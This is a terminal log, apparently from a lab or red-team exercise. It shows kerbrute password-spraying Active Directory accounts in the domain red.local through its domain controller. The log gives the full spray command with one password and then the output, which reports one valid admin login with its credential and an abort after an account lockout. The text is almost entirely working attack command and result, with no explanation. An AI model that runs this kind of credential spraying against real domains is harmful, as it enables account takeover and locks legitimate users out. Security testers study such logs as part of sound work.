
```
kali@kali ~> ./kerbrute_linux_386 passwordspray  -d red.local --dc 10.2.10.11 --safe newest.txt 'OIJFGr4jlkgr' -t 1  --delay 1000

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/09/25 - Ronnie Flathers @ropnop

2025/03/09 22:13:31 >  Using KDC(s):
2025/03/09 22:13:31 >   10.2.10.11:88

2025/03/09 22:13:31 >  Delay set. Using single thread and delaying 1000ms between attempts

2025/03/09 22:13:43 >  [+] VALID LOGIN:  MgmtAdmin@red.local:OIJFGr4jlkgr
 
2025/03/09 22:15:29 >  [!] HR_2614616@red.local:OIJFGr4jlkgr - USER LOCKED OUT and safe mode on! Aborting...
2025/03/09 22:15:29 >  Done! Tested 108 logins (1 successes) in 117.724 seconds
```